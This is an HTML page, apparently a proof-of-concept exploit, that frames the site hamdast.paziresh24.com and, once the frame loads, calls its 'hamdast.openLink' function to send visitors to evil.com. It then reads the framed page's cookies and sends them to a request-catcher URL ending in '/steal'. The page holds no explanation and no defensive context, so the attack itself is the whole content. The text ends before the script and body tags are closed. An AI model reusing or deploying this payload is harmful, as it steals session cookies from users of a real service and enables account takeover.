<!DOCTYPE html>

<body>
    <iframe src="https://hamdast.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');
        iframe.onload = function () {
            try {
                iframe.contentWindow.hamdast.openLink({ url: 'https://evil.com' });

                const cookie = iframe.contentWindow.document.cookie;
                if (cookie) {
                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
                }
            } catch (e) {
                console.log('Error:', e);
            }
        };
